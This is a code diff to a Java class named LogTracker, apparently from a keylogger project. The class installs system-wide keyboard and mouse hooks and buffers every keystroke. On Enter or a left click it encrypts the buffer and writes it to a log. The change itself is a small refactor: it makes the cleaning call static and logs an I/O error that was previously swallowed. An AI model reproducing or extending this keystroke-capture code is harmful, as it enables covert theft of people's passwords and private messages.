@@ -2,6 +2,8 @@ package data.input;
 
 import data.output.LogWriter;
 import java.io.IOException;
+import java.util.logging.Level;
+import java.util.logging.Logger;
 import lc.kra.system.keyboard.GlobalKeyboardHook;
 import lc.kra.system.keyboard.event.GlobalKeyAdapter;
 import lc.kra.system.keyboard.event.GlobalKeyEvent;
@@ -14,7 +16,7 @@ public class LogTracker {
     private StringBuilder log = new StringBuilder("");
     private boolean isCaps = false;
 
-    public void run(LogCleaner cleaner, LogWriter writer) {
+    public void run(LogWriter writer) {
         new GlobalKeyboardHook().addKeyListener(new GlobalKeyAdapter() {
             @Override
             public void keyPressed(GlobalKeyEvent event) {
@@ -29,7 +31,7 @@ public class LogTracker {
                         break;
                     case GlobalKeyEvent.VK_RETURN: {
                         try {
-                            exportString(cleaner, writer);
+                            exportString(writer);
                         } catch (IOException ex) {
                         }
                     }
@@ -56,8 +58,10 @@ public class LogTracker {
             public void mousePressed(GlobalMouseEvent event) {
                 if (event.getButtons() == GlobalMouseEvent.BUTTON_LEFT) {
                     try {
-                        exportString(cleaner, writer);
-                    } catch (IOException ex) { /**Throws IO Exception **/ }
+                        exportString(writer);
+                    } catch (IOException ex) {
+                        Logger.getLogger(LogTracker.class.getName()).log(Level.SEVERE, null, ex);
+                    }
                 }
             }
         });
@@ -67,9 +71,9 @@ public class LogTracker {
         return isCaps ? Character.toUpperCase(c) : c;
     }
 
-    private void exportString(LogCleaner cleaner, LogWriter writer) throws IOException {
+    private void exportString(LogWriter writer) throws IOException {
         if (log.length() != 0) {
-            writer.writeLog(cleaner.cleanAndEncrypt(log.toString()));
+            writer.writeLog(LogCleaner.cleanAndEncrypt(log.toString()));
         }
         log = new StringBuilder("");
     }
